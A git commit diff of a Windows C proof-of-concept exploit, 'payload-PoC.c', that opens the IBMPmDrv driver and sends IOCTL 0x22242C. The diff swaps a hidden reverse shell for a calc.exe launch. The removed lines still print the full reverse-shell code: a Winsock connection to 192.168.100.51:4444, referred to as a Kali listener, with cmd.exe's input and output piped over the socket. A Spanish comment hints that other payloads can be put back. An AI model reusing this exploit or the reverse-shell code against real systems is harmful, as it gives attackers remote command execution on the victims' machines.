30c4317169d0ce37527399db5ad6a6595ed07398
ElDidacta <psocik89@gmail.com>
2026-09-25 03:39:29 -0300

    Change functionality to open calculator application
    Modified the code to launch the calculator application instead of establishing a network connection.

--- payload-PoC.c
+++ payload-PoC.c
@@ -1,14 +1,18 @@
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
-#include <winsock2.h>
+/*
+el codigo fue modificado para que abra la 
+calculadora. Logicamente varios sabemos 
+que acciones se puede tomar. 
+*/
+
+
 #include <windows.h>
 #include <stdio.h>
-
-#pragma comment(lib, "ws2_32.lib")
 
 #define DRIVER_NAME "\\\\.\\IBMPmDrv"
 #define TARGET_IOCTL 0x22242C
 
 int main() {
+    // Intentar abrir el manejador del driver
     HANDLE hDriver = CreateFileA(DRIVER_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
     if (hDriver == INVALID_HANDLE_VALUE) {
@@ -18,46 +22,37 @@ int main() {
 
     DWORD inB = 0x41414141, outB = 0, bytes;
 
+    // Enviar el código de control IOCTL al driver
     if (DeviceIoControl(hDriver, TARGET_IOCTL, &inB, 4, &outB, 4, &bytes, NULL)) {
-        printf("[!] IOCTL 0x22242C exitoso. Iniciando conexion...\n");
+        printf("[!] IOCTL 0x22242C exitoso. Iniciando la calculadora...\n");
 
-        WSADATA wsaData;
-        WSAStartup(MAKEWORD(2, 2), &wsaData);
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+        
+        // Inicializar las estructuras para el nuevo proceso
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_SHOW; // Cambiar a SW_HIDE si querés que corra en segundo plano
 
-        SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-        struct sockaddr_in addr;
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = inet_addr("192.168.100.51");
-        addr.sin_port = htons(4444);
+        // Ruta de la aplicación que se desea ejecutar
+        char calcPath[] = "C:\\Windows\\System32\\calc.exe";
 
-        if (WSAConnect(s, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
-            printf("[+] Conectado. Manteniendo shell abierta...\n");
-
-            STARTUPINFOA si;
-            PROCESS_INFORMATION pi;
-            ZeroMemory(&si, sizeof(si));
-            si.cb = sizeof(si);
-            si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-
-            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
-            si.wShowWindow = SW_HIDE;
-
-            char cmdPath[] = "cmd.exe";
-
-            if (CreateProcessA(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-                WaitForSingleObject(pi.hProcess, INFINITE);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            }
+        // Crear el proceso de la calculadora de forma independiente
+        if (CreateProcessA(NULL, calcPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            printf("[+] Calculadora abierta con exito.\n");
+            
+            // Cerrar los manejadores devueltos para evitar fugas de memoria
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        } else {
+            printf("[-] Error al intentar ejecutar la calculadora. Codigo: %lu\n", GetLastError());
         }
-        else {
-            printf("[-] Error de red. Revisa el listener en Kali.\n");
-        }
-
-        closesocket(s);
-        WSACleanup();
+    } else {
+        printf("[-] Error al enviar el comando IOCTL.\n");
     }
 
     CloseHandle(hDriver);
     return 0;
 }
+
